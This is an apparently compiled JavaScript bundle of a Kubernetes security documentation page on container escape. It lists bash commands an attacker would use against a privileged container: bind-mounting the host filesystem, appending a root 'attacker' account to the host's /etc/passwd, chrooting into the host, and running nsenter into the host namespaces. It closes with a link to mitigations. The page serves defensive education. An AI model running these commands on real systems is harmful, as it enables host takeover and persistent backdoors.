"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[6452],{2956:(e,s,t)=>{t.r(s),t.d(s,{assets:()=>c,contentTitle:()=>o,default:()=>d,frontMatter:()=>r,metadata:()=>n,toc:()=>l});const n=JSON.parse('{"id":"attack_vectors/container_escape","title":"Container Escape","description":"Understanding container escape vulnerabilities and how attackers break out of containers to compromise the host system.","source":"@site/docs/attack_vectors/container_escape.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/container_escape","permalink":"/k8s_security/docs/attack_vectors/container_escape","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/container_escape.md","tags":[],"version":"current","sidebarPosition":7,"frontMatter":{"sidebar_position":7,"title":"Container Escape","description":"Understanding container escape vulnerabilities and how attackers break out of containers to compromise the host system."},"sidebar":"guidesSidebar","previous":{"title":"Privileged Containers","permalink":"/k8s_security/docs/attack_vectors/privileged_containers"},"next":{"title":"Insecure RBAC Permissions","permalink":"/k8s_security/docs/attack_vectors/insecure_rbac_permissions"}}');var i=t(4848),a=t(8453);const r={sidebar_position:7,title:"Container Escape",description:"Understanding container escape vulnerabilities and how attackers break out of containers to compromise the host system."},o="Container Escape",c={},l=[{value:"Exploitation Steps: Breaking Out of a Container",id:"exploitation-steps-breaking-out-of-a-container",level:2},{value:"Step 1: Identify the Environment",id:"step-1-identify-the-environment",level:3},{value:"Step 2: Mount the Host Filesystem",id:"step-2-mount-the-host-filesystem",level:3},{value:"Step 3: Escalate Privileges",id:"step-3-escalate-privileges",level:3},{value:"Step 4: Gain a Host Shell",id:"step-4-gain-a-host-shell",level:3},{value:"Step 5: Escape to the Host&#39;s Namespaces",id:"step-5-escape-to-the-hosts-namespaces",level:3},{value:"<strong>Explanation of the Flags:</strong>",id:"explanation-of-the-flags",level:4},{value:"<strong>Expected Result</strong>",id:"expected-result",level:3},{value:"Mitigation Steps",id:"mitigation-steps",level:2}];function h(e){const s={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,a.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(s.header,{children:(0,i.jsx)(s.h1,{id:"container-escape",children:"Container Escape"})}),"\n",(0,i.jsxs)(s.p,{children:["A ",(0,i.jsx)(s.strong,{children:"container escape"})," occurs when an attacker exploits vulnerabilities in a containerized environment to ",(0,i.jsx)(s.strong,{children:"break out of the container"})," and gain access to the ",(0,i.jsx)(s.strong,{children:"underlying host system"}),". This can lead to ",(0,i.jsx)(s.strong,{children:"privilege escalation, data exfiltration, and full cluster compromise"}),"."]}),"\n",(0,i.jsx)(s.hr,{}),"\n",(0,i.jsx)(s.h2,{id:"exploitation-steps-breaking-out-of-a-container",children:"Exploitation Steps: Breaking Out of a Container"}),"\n",(0,i.jsx)(s.p,{children:"An attacker gains access to a misconfigured or vulnerable container and attempts to escape to the host."}),"\n",(0,i.jsx)(s.h3,{id:"step-1-identify-the-environment",children:"Step 1: Identify the Environment"}),"\n",(0,i.jsxs)(s.p,{children:["The attacker checks if the container is running as ",(0,i.jsx)(s.strong,{children:"privileged"})," or has access to the host filesystem:"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"cat /proc/1/cgroup\nls -la /root\n"})}),"\n",(0,i.jsx)(s.p,{children:"If the output reveals unrestricted access, the attacker proceeds to escape."}),"\n",(0,i.jsx)(s.h3,{id:"step-2-mount-the-host-filesystem",children:"Step 2: Mount the Host Filesystem"}),"\n",(0,i.jsx)(s.p,{children:"The attacker attempts to mount the host filesystem inside the container:"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"mkdir /mnt/host\nmount -o bind / /mnt/host\n"})}),"\n",(0,i.jsx)(s.h3,{id:"step-3-escalate-privileges",children:"Step 3: Escalate Privileges"}),"\n",(0,i.jsxs)(s.p,{children:["If the container runs as root and ",(0,i.jsx)(s.code,{children:"/mnt/host"})," is accessible, the attacker can create a new root user on the host:"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"echo 'attacker:x:0:0::/root:/bin/bash' >> /mnt/host/etc/passwd\n"})}),"\n",(0,i.jsx)(s.h3,{id:"step-4-gain-a-host-shell",children:"Step 4: Gain a Host Shell"}),"\n",(0,i.jsx)(s.p,{children:"The attacker spawns a shell on the host system:"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"chroot /mnt/host /bin/bash\n"})}),"\n",(0,i.jsxs)(s.p,{children:["At this stage, the attacker has modified the host\u2019s filesystem and potentially created a persistent backdoor, but they are still within the container\u2019s ",(0,i.jsx)(s.strong,{children:"process namespace"}),", meaning they do not fully control the host yet."]}),"\n",(0,i.jsx)(s.h3,{id:"step-5-escape-to-the-hosts-namespaces",children:"Step 5: Escape to the Host's Namespaces"}),"\n",(0,i.jsxs)(s.p,{children:["To gain full control over the host, the attacker must enter the ",(0,i.jsx)(s.strong,{children:"host's namespaces"}),":"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"nsenter --target 1 --mount --uts --ipc --net --pid\n"})}),"\n",(0,i.jsx)(s.h4,{id:"explanation-of-the-flags",children:(0,i.jsx)(s.strong,{children:"Explanation of the Flags:"})}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"--target 1"})," \u2192 Targets ",(0,i.jsx)(s.strong,{children:"PID 1"})," (which is ",(0,i.jsx)(s.code,{children:"systemd"})," or ",(0,i.jsx)(s.code,{children:"init"})," on the host)."]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"--mount"})," \u2192 Joins the host's ",(0,i.jsx)(s.strong,{children:"mount namespace"}),"."]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"--uts"})," \u2192 Joins the host's ",(0,i.jsx)(s.strong,{children:"UTS (hostname) namespace"}),"."]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"--ipc"})," \u2192 Joins the host's ",(0,i.jsx)(s.strong,{children:"inter-process communication namespace"}),"."]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"--net"})," \u2192 Joins the host's ",(0,i.jsx)(s.strong,{children:"network namespace"}),"."]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"--pid"})," \u2192 Joins the host's ",(0,i.jsx)(s.strong,{children:"process namespace"}),", making ",(0,i.jsx)(s.code,{children:"ps aux"})," show all host processes."]}),"\n"]}),"\n",(0,i.jsx)(s.h3,{id:"expected-result",children:(0,i.jsx)(s.strong,{children:"Expected Result"})}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsxs)(s.li,{children:["Running ",(0,i.jsx)(s.code,{children:"hostname"})," should now return ",(0,i.jsx)(s.strong,{children:"the host\u2019s real name"})," (e.g., ",(0,i.jsx)(s.code,{children:"controlplane"}),")."]}),"\n",(0,i.jsxs)(s.li,{children:["Running ",(0,i.jsx)(s.code,{children:"ps aux"})," should now display ",(0,i.jsx)(s.strong,{children:"all host processes"}),"."]}),"\n"]}),"\n",(0,i.jsx)(s.p,{children:"Once these steps are completed, the attacker has fully escaped the container and can execute arbitrary commands on the host."}),"\n",(0,i.jsx)(s.hr,{}),"\n",(0,i.jsx)(s.h2,{id:"mitigation-steps",children:"Mitigation Steps"}),"\n",(0,i.jsx)(s.p,{children:"To prevent container escape vulnerabilities, follow the security best practices outlined in:"}),"\n",(0,i.jsxs)(s.p,{children:["\u27a1 ",(0,i.jsx)(s.strong,{children:(0,i.jsx)(s.a,{href:"/docs/best_practices/cluster_setup_and_hardening/pod_security/container_escape_mitigation",children:"Preventing Container Escape"})})]}),"\n",(0,i.jsxs)(s.p,{children:["This guide covers techniques such as ",(0,i.jsx)(s.strong,{children:"disabling privileged containers, restricting host filesystem access, enforcing least privilege principles, and applying security policies"})," to mitigate container escape risks."]})]})}function d(e={}){const{wrapper:s}={...(0,a.R)(),...e.components};return s?(0,i.jsx)(s,{...e,children:(0,i.jsx)(h,{...e})}):h(e)}},8453:(e,s,t)=>{t.d(s,{R:()=>r,x:()=>o});var n=t(6540);const i={},a=n.createContext(i);function r(e){const s=n.useContext(a);return n.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function o(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:r(e.components),n.createElement(a.Provider,{value:s},e.children)}}}]);